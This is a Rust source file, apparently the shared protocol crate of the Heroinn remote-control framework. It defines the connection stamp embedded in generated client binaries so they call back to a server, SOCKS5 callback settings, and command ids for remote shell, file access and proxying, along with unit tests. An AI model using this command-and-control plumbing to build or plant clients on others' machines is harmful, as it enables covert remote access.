//! Foundations shared by the Heroinn server, client and worker binaries.
//!
//! This crate owns the wire protocol: the [`SlaveDNA`] connection stamp, the
//! message/command id mappings, the packet (de)serialization helpers and the
//! TCP/WebSocket/UDP transports built on top of them. Every byte layout here is
//! load-bearing for interoperability, so protocol changes must stay additive.

use std::fmt;
use std::io::{BufWriter, Cursor, Read, Write};
use std::net::{IpAddr, Ipv6Addr};

use dna::CONNECTION_INFO_FLAG;
use serde::{Deserialize, Serialize};

pub mod dna;
pub mod error;
pub mod ftp;
pub mod packet;
pub mod protocol;
pub mod rpc;
pub mod session;
pub mod socks5;
pub mod transfer_rate;

pub use error::{Error, Result};
pub use transfer_rate::{
    DEFAULT_TRANSFER_RATE, TransferRateUnit, format_transfer_rate_input, parse_transfer_rate,
};

/// Interval, in seconds, between client heartbeats.
pub const HEART_BEAT_TIME: u64 = 5;

/// Maximum JSON payload size carried inside a [`SlaveDNA`] connection stamp.
pub const CONNECTION_INFO_DATA_LEN: usize = 1024;

/// Serialized size of a [`SlaveDNA`]: flag, big-endian length and payload.
pub const SLAVE_DNA_LEN: usize = 16 + CONNECTION_INFO_DATA_LEN;

/// Maximum byte length of one SOCKS5 RFC 1929 credential field.
pub const SOCKS5_AUTH_FIELD_MAX_BYTES: usize = u8::MAX as usize;

/// Connection stamp embedded into every generated `heroinn_client` binary.
///
/// The generator rewrites this fixed-size region in-place inside the executable
/// so the client learns where to dial home. `#[repr(align(1))]` keeps the
/// on-disk image byte-exact.
#[derive(Debug, Clone, Copy)]
#[repr(C, align(1))]
pub struct SlaveDNA {
    pub flag: [u8; 8],
    pub size: [u8; 8],
    pub data: [u8; CONNECTION_INFO_DATA_LEN],
}

impl SlaveDNA {
    /// Build a stamp carrying `data`, which must fit in 1024 bytes.
    pub fn new(data: &[u8]) -> Result<Self> {
        if data.len() > CONNECTION_INFO_DATA_LEN {
            return Err(Error::PacketTooLarge(data.len()));
        }

        let mut buf = [0u8; CONNECTION_INFO_DATA_LEN];
        buf[..data.len()].copy_from_slice(data);

        Ok(Self {
            flag: CONNECTION_INFO_FLAG,
            size: (data.len() as u64).to_be_bytes(),
            data: buf,
        })
    }

    /// Parse a stamp from its serialized form.
    pub fn parse(data: &[u8]) -> Result<Self> {
        let mut reader = Cursor::new(data);
        let mut flag = [0u8; 8];
        reader.read_exact(&mut flag)?;

        let mut size = [0u8; 8];
        reader.read_exact(&mut size)?;

        let mut data = [0u8; CONNECTION_INFO_DATA_LEN];
        reader.read_exact(&mut data)?;

        if flag != CONNECTION_INFO_FLAG {
            return Err(Error::Malformed("invalid connection info flag"));
        }

        let payload_len = u64::from_be_bytes(size);
        if payload_len > CONNECTION_INFO_DATA_LEN as u64 {
            return Err(Error::PacketTooLarge(payload_len as usize));
        }

        Ok(Self { flag, size, data })
    }

    /// Return the decoded JSON payload.
    pub fn payload(&self) -> Result<&[u8]> {
        let size = u64::from_be_bytes(self.size);
        if size > CONNECTION_INFO_DATA_LEN as u64 {
            return Err(Error::PacketTooLarge(size as usize));
        }

        Ok(&self.data[..size as usize])
    }

    /// Serialize the stamp into its 1040-byte on-disk representation.
    pub fn serialize(&self) -> Vec<u8> {
        let mut ret = vec![];

        let mut writer = BufWriter::new(&mut ret);
        writer.write_all(&self.flag).unwrap();
        writer.write_all(&self.size).unwrap();
        writer.write_all(&self.data).unwrap();
        drop(writer);

        ret
    }
}

/// Optional SOCKS5 username/password authentication embedded in a generated client.
#[derive(Serialize, Deserialize, Clone, PartialEq, Eq)]
pub struct Socks5Auth {
    pub username: String,
    pub password: String,
}

impl fmt::Debug for Socks5Auth {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str("Socks5Auth(<redacted>)")
    }
}

impl Socks5Auth {
    pub fn new(username: &str, password: &str) -> Result<Self> {
        let auth = Self {
            username: username.to_string(),
            password: password.to_string(),
        };
        auth.validate()?;
        Ok(auth)
    }

    fn validate(&self) -> Result<()> {
        validate_socks5_auth_field("username", &self.username)?;
        validate_socks5_auth_field("password", &self.password)
    }
}

/// A SOCKS5 hop that a generated client dials before reaching Heroinn.
#[derive(Serialize, Deserialize, Clone, PartialEq, Eq)]
pub struct Socks5ProxyConfig {
    pub host: String,
    pub port: u16,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub auth: Option<Socks5Auth>,
}

impl fmt::Debug for Socks5ProxyConfig {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter
            .debug_struct("Socks5ProxyConfig")
            .field("host", &self.host)
            .field("port", &self.port)
            .field("auth", &self.auth.as_ref().map(|_| "<redacted>"))
            .finish()
    }
}

impl Socks5ProxyConfig {
    pub fn new(host: &str, port: u16) -> Result<Self> {
        let config = Self {
            host: normalize_socks5_proxy_host(host)?,
            port,
            auth: None,
        };
        config.validate()?;
        Ok(config)
    }

    pub fn with_auth(host: &str, port: u16, username: &str, password: &str) -> Result<Self> {
        let config = Self {
            host: normalize_socks5_proxy_host(host)?,
            port,
            auth: Some(Socks5Auth::new(username, password)?),
        };
        config.validate()?;
        Ok(config)
    }

    pub fn validate(&self) -> Result<()> {
        if self.host.trim().is_empty() {
            return Err(Error::Other("SOCKS5 proxy host is required".to_string()));
        }
        if self.host != normalize_socks5_proxy_host(&self.host)? {
            return Err(Error::Other(
                "SOCKS5 proxy host must be a domain, IPv4 address, or bracketed IPv6 address"
                    .to_string(),
            ));
        }
        if self.port == 0 {
            return Err(Error::Other(
                "SOCKS5 proxy port must be between 1 and 65535".to_string(),
            ));
        }
        if let Some(auth) = &self.auth {
            auth.validate()?;
        }
        Ok(())
    }

    /// Credential-free `host:port` representation.
    pub fn authority(&self) -> String {
        if self.host.parse::<Ipv6Addr>().is_ok() {
            format!("[{}]:{}", self.host, self.port)
        } else {
            format!("{}:{}", self.host, self.port)
        }
    }
}

fn normalize_socks5_proxy_host(host: &str) -> Result<String> {
    let host = host.trim();
    if host.is_empty() {
        return Err(Error::Other("SOCKS5 proxy host is required".to_string()));
    }
    if host
        .chars()
        .any(|character| character.is_control() || character.is_whitespace())
    {
        return Err(Error::Other(
            "SOCKS5 proxy host contains invalid whitespace or control characters".to_string(),
        ));
    }

    let normalized = normalize_host(host)
        .map_err(|_| Error::Other("SOCKS5 proxy host is invalid".to_string()))?;
    Ok(normalized
        .strip_prefix('[')
        .and_then(|value| value.strip_suffix(']'))
        .unwrap_or(&normalized)
        .to_string())
}

fn validate_socks5_auth_field(name: &'static str, value: &str) -> Result<()> {
    let bytes = value.as_bytes();
    if bytes.is_empty() || bytes.len() > SOCKS5_AUTH_FIELD_MAX_BYTES {
        return Err(Error::Other(format!(
            "SOCKS5 {name} must be between 1 and {SOCKS5_AUTH_FIELD_MAX_BYTES} UTF-8 bytes"
        )));
    }
    if bytes
        .iter()
        .any(|byte| matches!(byte, b'\0' | b'\r' | b'\n'))
    {
        return Err(Error::Other(format!(
            "SOCKS5 {name} must not contain NUL, CR, or LF"
        )));
    }
    Ok(())
}

/// Location and label a generated client should connect back to.
#[derive(Serialize, Deserialize, Clone, PartialEq, Eq)]
pub struct ConnectionInfo {
    pub protocol: u8,
    pub address: String,
    pub remark: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub socks5_proxy: Option<Socks5ProxyConfig>,
}

impl fmt::Debug for ConnectionInfo {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter
            .debug_struct("ConnectionInfo")
            .field("protocol", &self.protocol)
            .field("address", &self.address)
            .field("remark", &self.remark)
            .field("socks5_proxy", &self.socks5_proxy)
            .finish()
    }
}

impl ConnectionInfo {
    /// Validate and build the connection information shown in the generator.
    pub fn new(protocol: HeroinnProtocol, host: &str, port: &str, remark: &str) -> Result<Self> {
        Self::new_with_socks5(protocol, host, port, remark, None)
    }

    /// Validate and build connection information with an optional specified SOCKS5 hop.
    pub fn new_with_socks5(
        protocol: HeroinnProtocol,
        host: &str,
        port: &str,
        remark: &str,
        socks5_proxy: Option<Socks5ProxyConfig>,
    ) -> Result<Self> {
        let host = host.trim();
        if host.is_empty() {
            return Err(Error::Other("address is required".to_string()));
        }

        let port: u16 = port
            .trim()
            .parse()
            .map_err(|_| Error::Other("port must be an integer between 1 and 65535".to_string()))?;
        if port == 0 {
            return Err(Error::Other("port must be between 1 and 65535".to_string()));
        }

        let info = Self {
            protocol: protocol.to_u8(),
            address: format!("{}:{}", normalize_host(host)?, port),
            remark: remark.trim().to_string(),
            socks5_proxy,
        };
        info.validate()?;

        let payload_len = info.serialize()?.len();
        if payload_len > CONNECTION_INFO_DATA_LEN {
            return Err(Error::PacketTooLarge(payload_len));
        }

        Ok(info)
    }

    pub fn parse(data: &[u8]) -> Result<Self> {
        let info: Self = serde_json::from_slice(data)?;
        info.validate()?;
        Ok(info)
    }

    pub fn serialize(&self) -> Result<Vec<u8>> {
        self.validate()?;
        let payload = serde_json::to_vec(self)?;
        if payload.len() > CONNECTION_INFO_DATA_LEN {
            return Err(Error::PacketTooLarge(payload.len()));
        }
        Ok(payload)
    }

    pub fn validate(&self) -> Result<()> {
        if let Some(proxy) = &self.socks5_proxy {
            let protocol = HeroinnProtocol::try_from(self.protocol)?;
            if !matches!(protocol, HeroinnProtocol::TCP | HeroinnProtocol::HTTP) {
                return Err(Error::Other(
                    "SOCKS5 proxy is only supported for TCP and HTTP clients".to_string(),
                ));
            }
            proxy.validate()?;
        }
        Ok(())
    }
}

fn normalize_host(host: &str) -> Result<String> {
    if let Ok(ip) = host.parse::<IpAddr>() {
        return Ok(match ip {
            IpAddr::V4(_) => ip.to_string(),
            IpAddr::V6(_) => format!("[{}]", ip),
        });
    }

    if let Some(inner) = host.strip_prefix('[').and_then(|h| h.strip_suffix(']')) {
        let ip = inner
            .parse::<Ipv6Addr>()
            .map_err(|_| Error::Other("invalid bracketed IPv6 address".to_string()))?;
        return Ok(format!("[{}]", ip));
    }

    if host.contains(':') {
        return Err(Error::Other(
            "address must not include a port; enter the port separately".to_string(),
        ));
    }

    if host.len() > 253 {
        return Err(Error::Other("address is too long".to_string()));
    }

    for label in host.split('.') {
        let valid = !label.is_empty()
            && label.len() <= 63
            && !label.starts_with('-')
            && !label.ends_with('-')
            && label
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_');
        if !valid {
            return Err(Error::Other("address is not a valid host name".to_string()));
        }
    }

    Ok(host.to_string())
}

#[cfg(test)]
mod connection_info_tests {
    use super::*;

    #[test]
    fn builds_normalized_connection_addresses() {
        assert_eq!(
            ConnectionInfo::new(HeroinnProtocol::TCP, " 127.0.0.1 ", " 9001 ", " debug ").unwrap(),
            ConnectionInfo {
                protocol: 0,
                address: "127.0.0.1:9001".to_string(),
                remark: "debug".to_string(),
                socks5_proxy: None,
            }
        );

        assert_eq!(
            ConnectionInfo::new(HeroinnProtocol::HTTP, "example.com", "443", "")
                .unwrap()
                .address,
            "example.com:443"
        );
        assert_eq!(
            ConnectionInfo::new(HeroinnProtocol::UDP, "::1", "8000", "v6")
                .unwrap()
                .address,
            "[::1]:8000"
        );
        assert_eq!(
            ConnectionInfo::new(HeroinnProtocol::UDP, "[::1]", "8000", "v6")
                .unwrap()
                .address,
            "[::1]:8000"
        );
    }

    #[test]
    fn rejects_invalid_addresses_and_ports() {
        for (host, port) in [
            ("", "9001"),
            ("example.com", "0"),
            ("example.com", "65536"),
            ("example.com", "not-a-port"),
            ("example.com:9001", "9001"),
            ("bad host", "9001"),
            ("-bad.example", "9001"),
            ("[not-ipv6]", "9001"),
        ] {
            assert!(
                ConnectionInfo::new(HeroinnProtocol::TCP, host, port, "").is_err(),
                "{host}:{port} should be rejected"
            );
        }
    }

    #[test]
    fn rejects_connection_info_larger_than_stamp() {
        let remark = "x".repeat(CONNECTION_INFO_DATA_LEN);
        let err =
            ConnectionInfo::new(HeroinnProtocol::TCP, "127.0.0.1", "9001", &remark).unwrap_err();
        assert!(matches!(err, Error::PacketTooLarge(_)));
    }

    #[test]
    fn socks5_connection_info_round_trips_and_redacts_credentials() {
        let proxy =
            Socks5ProxyConfig::with_auth("[::1]", 1080, "proxy-user", "proxy-password").unwrap();
        assert_eq!(proxy.authority(), "[::1]:1080");
        assert_eq!(proxy.host, "::1");

        let info = ConnectionInfo::new_with_socks5(
            HeroinnProtocol::HTTP,
            "server.example",
            "443",
            "production",
            Some(proxy),
        )
        .unwrap();
        let payload = info.serialize().unwrap();
        assert_eq!(ConnectionInfo::parse(&payload).unwrap(), info);

        let debug = format!("{info:?}");
        assert!(debug.contains("Socks5ProxyConfig"));
        assert!(!debug.contains("proxy-user"));
        assert!(!debug.contains("proxy-password"));
        assert!(!debug.contains("user:password"));
    }

    #[test]
    fn old_connection_info_without_socks5_defaults_to_none() {
        let info =
            ConnectionInfo::parse(br#"{"protocol":0,"address":"127.0.0.1:9001","remark":"old"}"#)
                .unwrap();
        assert_eq!(info.socks5_proxy, None);

        #[derive(Deserialize)]
        struct LegacyConnectionInfo {
            protocol: u8,
            address: String,
            remark: String,
        }
        let new = ConnectionInfo::new_with_socks5(
            HeroinnProtocol::TCP,
            "127.0.0.1",
            "9001",
            "new",
            Some(Socks5ProxyConfig::new("proxy.example", 1080).unwrap()),
        )
        .unwrap();
        let legacy: LegacyConnectionInfo =
            serde_json::from_slice(&new.serialize().unwrap()).unwrap();
        assert_eq!(legacy.protocol, 0);
        assert_eq!(legacy.address, "127.0.0.1:9001");
        assert_eq!(legacy.remark, "new");
    }

    #[test]
    fn socks5_connection_info_rejects_unsafe_or_oversized_values() {
        for (host, port, expected) in [
            ("", 1080, "host is required"),
            ("bad host", 1080, "invalid whitespace"),
            ("proxy.example:1080", 1080, "host is invalid"),
        ] {
            let error = Socks5ProxyConfig::new(host, port).unwrap_err();
            assert!(
                error.to_string().contains(expected),
                "{host}: {expected} / {error}"
            );
        }
        assert!(Socks5ProxyConfig::new("proxy.example", 0).is_err());
        for (username, password) in [
            ("", "password"),
            ("username", ""),
            ("bad\nname", "password"),
            ("username", "bad\0password"),
        ] {
            assert!(
                Socks5ProxyConfig::with_auth("proxy.example", 1080, username, password).is_err(),
                "{username:?}/{password:?} should be rejected"
            );
        }
        assert!(
            Socks5ProxyConfig::with_auth(
                "proxy.example",
                1080,
                &"u".repeat(SOCKS5_AUTH_FIELD_MAX_BYTES + 1),
                "password",
            )
            .is_err()
        );

        let udp = ConnectionInfo::new_with_socks5(
            HeroinnProtocol::UDP,
            "127.0.0.1",
            "8000",
            "",
            Some(Socks5ProxyConfig::new("proxy.example", 1080).unwrap()),
        );
        assert!(udp.is_err());

        let remark = "r".repeat(CONNECTION_INFO_DATA_LEN);
        assert!(
            ConnectionInfo::new_with_socks5(
                HeroinnProtocol::TCP,
                "server.example",
                "9001",
                &remark,
                Some(Socks5ProxyConfig::new("proxy.example", 1080).unwrap()),
            )
            .is_err()
        );
    }

    #[test]
    fn slave_dna_layout_is_fixed() {
        assert_eq!(std::mem::size_of::<SlaveDNA>(), SLAVE_DNA_LEN);

        let stamp = SlaveDNA::new(b"test").unwrap().serialize();
        assert_eq!(stamp.len(), SLAVE_DNA_LEN);
        assert_eq!(&stamp[..8], &CONNECTION_INFO_FLAG);
        assert_eq!(&stamp[8..16], &4u64.to_be_bytes());
        assert_eq!(&stamp[16..20], b"test");
        assert!(stamp[20..].iter().all(|byte| *byte == 0));
    }
}

/// Messages a client sends up to the server.
#[derive(Debug, PartialEq, Eq)]
pub enum HeroinnClientMsgID {
    HostInfo,
    Heartbeat,
    SessionPacket,
    Socks5,
}

impl From<HeroinnClientMsgID> for u8 {
    fn from(id: HeroinnClientMsgID) -> Self {
        match id {
            HeroinnClientMsgID::HostInfo => 0x00,
            HeroinnClientMsgID::Heartbeat => 0x01,
            HeroinnClientMsgID::SessionPacket => 0x02,
            HeroinnClientMsgID::Socks5 => 0x03,
        }
    }
}

impl TryFrom<u8> for HeroinnClientMsgID {
    type Error = Error;

    fn try_from(v: u8) -> Result<Self> {
        match v {
            0x00 => Ok(HeroinnClientMsgID::HostInfo),
            0x01 => Ok(HeroinnClientMsgID::Heartbeat),
            0x02 => Ok(HeroinnClientMsgID::SessionPacket),
            0x03 => Ok(HeroinnClientMsgID::Socks5),
            other => Err(Error::UnknownMessageId(other)),
        }
    }
}

impl HeroinnClientMsgID {
    /// Byte value written on the wire.
    pub fn to_u8(&self) -> u8 {
        match self {
            HeroinnClientMsgID::HostInfo => 0x00,
            HeroinnClientMsgID::Heartbeat => 0x01,
            HeroinnClientMsgID::SessionPacket => 0x02,
            HeroinnClientMsgID::Socks5 => 0x03,
        }
    }
}

/// Commands the server pushes down to a client.
#[derive(Debug, PartialEq, Eq)]
pub enum HeroinnServerCommandID {
    Shell,
    File,
    SessionPacket,
    SetTransferRate,
    Socks5,
}

impl From<HeroinnServerCommandID> for u8 {
    fn from(id: HeroinnServerCommandID) -> Self {
        match id {
            HeroinnServerCommandID::Shell => 0x00,
            HeroinnServerCommandID::File => 0x01,
            HeroinnServerCommandID::SessionPacket => 0x02,
            HeroinnServerCommandID::SetTransferRate => 0x03,
            HeroinnServerCommandID::Socks5 => 0x04,
        }
    }
}

impl TryFrom<u8> for HeroinnServerCommandID {
    type Error = Error;

    fn try_from(v: u8) -> Result<Self> {
        match v {
            0x00 => Ok(HeroinnServerCommandID::Shell),
            0x01 => Ok(HeroinnServerCommandID::File),
            0x02 => Ok(HeroinnServerCommandID::SessionPacket),
            0x03 => Ok(HeroinnServerCommandID::SetTransferRate),
            0x04 => Ok(HeroinnServerCommandID::Socks5),
            other => Err(Error::UnknownMessageId(other)),
        }
    }
}

impl HeroinnServerCommandID {
    /// Byte value written on the wire.
    pub fn to_u8(&self) -> u8 {
        match self {
            HeroinnServerCommandID::Shell => 0x00,
            HeroinnServerCommandID::File => 0x01,
            HeroinnServerCommandID::SessionPacket => 0x02,
            HeroinnServerCommandID::SetTransferRate => 0x03,
            HeroinnServerCommandID::Socks5 => 0x04,
        }
    }
}

#[cfg(test)]
mod server_command_tests {
    use super::*;

    #[test]
    fn transfer_rate_command_uses_additive_id() {
        assert_eq!(HeroinnServerCommandID::SetTransferRate.to_u8(), 0x03);
        assert_eq!(
            HeroinnServerCommandID::try_from(0x03).unwrap(),
            HeroinnServerCommandID::SetTransferRate
        );
    }

    #[test]
    fn socks5_commands_use_new_additive_ids() {
        assert_eq!(HeroinnServerCommandID::Socks5.to_u8(), 0x04);
        assert_eq!(
            HeroinnServerCommandID::try_from(0x04).unwrap(),
            HeroinnServerCommandID::Socks5
        );
        assert_eq!(HeroinnClientMsgID::Socks5.to_u8(), 0x03);
        assert_eq!(
            HeroinnClientMsgID::try_from(0x03).unwrap(),
            HeroinnClientMsgID::Socks5
        );
    }
}

/// Transport a listener or client speaks.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum HeroinnProtocol {
    TCP,
    HTTP,
    UDP,
}

impl From<HeroinnProtocol> for u8 {
    fn from(proto: HeroinnProtocol) -> Self {
        match proto {
            HeroinnProtocol::TCP => 0x00,
            HeroinnProtocol::HTTP => 0x01,
            HeroinnProtocol::UDP => 0x02,
        }
    }
}

impl TryFrom<u8> for HeroinnProtocol {
    type Error = Error;

    fn try_from(v: u8) -> Result<Self> {
        match v {
            0x00 => Ok(HeroinnProtocol::TCP),
            0x01 => Ok(HeroinnProtocol::HTTP),
            0x02 => Ok(HeroinnProtocol::UDP),
            other => Err(Error::UnknownProtocol(other)),
        }
    }
}

impl HeroinnProtocol {
    /// Byte value written on the wire.
    pub fn to_u8(&self) -> u8 {
        self.clone().into()
    }
}

/// Current wall-clock time in milliseconds since the Unix epoch.
pub fn cur_timestamp_millis() -> u128 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_millis()
}

/// Current wall-clock time in seconds since the Unix epoch.
pub fn cur_timestamp_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}
